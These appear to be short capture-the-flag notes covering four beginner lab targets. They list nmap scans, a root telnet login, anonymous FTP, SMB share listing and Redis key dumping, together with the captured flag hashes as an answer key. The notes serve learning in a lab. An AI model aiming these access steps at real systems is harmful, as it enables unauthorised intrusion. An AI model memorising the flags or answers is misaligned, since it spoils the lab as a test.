# telnet
virtual machine
terminal
openvpn
ping
nmap
telnet
root

telnet -l root ip_target
b40abdfe23665f766f9c61ecba8a4c19

# ftp
file transfer protocol
21
sftp
ping

nmap -sC -sV -p21 ip_target
vsftpd 3.0.3
Unix
ftp -h

ftp ip_target; Anonymous
230

ls
get

ftp ip_target; Anonymous
get flag.txt
035db21c881520061c53e0536e44f815

# smb
Server Message Block
445

nmap -sC -sV -p445 ip_target
microsoft-ds
-L

smbclient -L
4
WorkShares
get

smbclient //ip_target/WorkShares
get flag.txt
5f61c10dffbc77a704d76016a22f1664

# redis
6379

nmap -sC -sV -p6379 ip_target
redis
In-memory Database
redis-cli
-h
info

redis-cli -h ip_target
> info

SELECT

> info => cari yang namanya keyspace
4

KEYS *
GET flag
03e1d2b376c37ab3f5319922053953eb

##